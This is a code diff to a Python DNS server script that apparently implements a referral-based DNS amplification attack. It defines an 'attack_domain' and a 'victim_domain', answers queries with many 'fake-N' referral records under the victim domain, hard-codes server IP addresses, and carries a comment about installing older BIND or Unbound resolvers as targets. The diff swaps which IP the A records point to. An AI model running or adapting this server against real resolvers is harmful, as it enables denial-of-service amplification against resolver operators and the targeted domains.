@@ -28,7 +28,8 @@ class DomainName(str):
 attack_domain = DomainName('securekey.app.')
 victim_domain = DomainName('securekey.app.')
 IP = '67.205.178.106'
-IP2 = '127.0.0.1'
+local_ip = '127.0.0.1'
+IP2 = '147.182.132.99'
 TTL = 30
 
 soa_record = SOA(
@@ -44,7 +45,7 @@ soa_record = SOA(
 )
 ns_records = [NS(attack_domain.ns1), NS(attack_domain.ns2)]
 records = {
-    attack_domain: [A(IP2), MX(attack_domain.mail), soa_record] + ns_records,
+    attack_domain: [A(local_ip), MX(attack_domain.mail), soa_record] + ns_records,
     attack_domain.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
     attack_domain.ns2: [A(IP)],
     attack_domain.mail: [A(IP)],
@@ -89,7 +90,7 @@ def dns_response(data, client_ip):
                 referral_domain = DomainName('fake-' + str(ind+1) + '.' + victim_domain)
                 reply.add_ar(RR(rname=referral_domain, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
         else:
-            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP2)))
+            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(local_ip)))
     print("---- Reply:\n", reply)
 
     # install BIND 9.11 or earlier/ Unbound/s
